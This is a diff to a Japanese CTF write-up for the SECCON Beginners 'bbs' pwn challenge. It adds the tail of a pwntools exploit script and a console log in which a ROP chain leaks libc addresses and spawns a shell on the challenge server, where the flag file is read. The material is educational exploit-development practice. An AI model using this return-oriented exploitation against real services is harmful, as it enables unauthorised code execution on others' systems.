@@ -200,6 +200,8 @@ gef> x/x main
 0x4006a1 <main>:	0x80c48348e5894855
 ```
 
+## script
+
 スクリプトは以下
 `r.recvall(timeout=5)`では失敗したので、for-loopを回しながら`r.recvline(timeout=1)`をする
 
@@ -257,4 +259,31 @@ r.recvuntil('Input Content : ')
 print '[@] RETURNED TO main'
 r.sendline(another_buf)
 r.interactive()
+```
+
+## 実行結果
+
+```console
+$ python final.py 
+[+] Opening connection to pwn1.chall.beginners.seccon.jp on port 18373: Done
+system   : 0x7f5ca2893390
+libc_base: 0x7f5ca284e000
+binsh    : 0x7f5ca29dad57
+popret   : 0x400763
+[@] SUCCESSFULLY RETURNED TO main AGAIN!
+[*] Switching to interactive mode
+
+==============================
+
+Wed May 30 22:20:31 JST 2018
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAc\x07@
+
+==============================
+$ ls
+bbs
+flag.txt
+$ cat flag.txt
+ctf4b{Pr3p4r3_4rgum3n75_w17h_ROP_4nd_c4ll_4rb17r4ry_func710n5}
+$ 
+[*] Closed connection to pwn1.chall.beginners.seccon.jp port 18373
 ```
